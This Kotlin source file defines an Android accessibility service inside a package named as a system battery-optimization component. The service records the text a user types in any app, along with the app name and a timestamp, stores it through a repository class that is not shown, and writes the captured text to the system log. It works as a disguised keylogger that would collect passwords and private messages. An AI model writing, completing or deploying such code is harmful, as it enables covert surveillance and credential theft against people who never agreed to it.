package com.android.batteryoptimization

import android.accessibilityservice.AccessibilityService
import android.util.Log
import android.view.accessibility.AccessibilityEvent

class InputAccessibilityService : AccessibilityService() {

    private lateinit var repository: InputRepository

    override fun onServiceConnected() {
        super.onServiceConnected()
        repository = InputRepository.getInstance(applicationContext)
        Log.d(TAG, "Accessibility Service Connected")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            val packageName = event.packageName?.toString() ?: "Unknown"
            val appName = getAppName(packageName)
            val text = event.text.joinToString(" ")
            
            // Avoid capturing empty or blank strings unnecessarily
            if (text.isNotBlank()) {
                val inputEvent = InputEvent(
                    timestamp = System.currentTimeMillis(),
                    packageName = packageName,
                    appName = appName,
                    text = text
                )
                repository.addEvent(inputEvent)
                Log.d(TAG, "Captured input: $text from $packageName")
            }
        }
    }

    override fun onInterrupt() {
        Log.d(TAG, "Accessibility Service Interrupted")
    }

    private fun getAppName(packageName: String): String {
        return try {
            val pm = packageManager
            val applicationInfo = pm.getApplicationInfo(packageName, 0)
            pm.getApplicationLabel(applicationInfo).toString()
        } catch (e: Exception) {
            packageName
        }
    }

    companion object {
        private const val TAG = "InputAccessibility"
    }
}
